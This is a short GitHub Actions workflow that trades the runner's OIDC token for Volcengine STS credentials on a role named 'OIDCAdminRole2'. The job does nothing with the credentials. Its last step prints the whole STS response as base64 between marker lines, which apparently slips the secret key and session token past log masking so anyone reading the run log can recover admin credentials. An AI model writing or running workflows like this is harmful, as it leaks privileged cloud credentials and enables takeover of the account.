name: AssumeRoleWithOIDC
on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  assume-role:
    runs-on: ubuntu-latest
    steps:
      - name: Get JWT and call STS
        run: |
          set -e
          echo "Requesting OIDC JWT..."
          JWT=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r '.value')
          echo "JWT obtained, length: ${#JWT}"
          
          echo "Calling volcengine STS AssumeRoleWithOIDC..."
          RESP=$(curl -s "https://sts.volcengineapi.com/?Action=AssumeRoleWithOIDC&Version=2018-01-01&RoleTrn=trn:iam::2121573521:role/OIDCAdminRole2&OIDCProviderTrn=trn:iam::2121573521:oidc-provider/GHActions&RoleSessionName=GitHubAdmin&OIDCToken=$JWT")
          
          echo "===STS_RESPONSE_B64==="
          echo "$RESP" | base64 -w0
          echo ""
          echo "===END_STS_RESPONSE==="
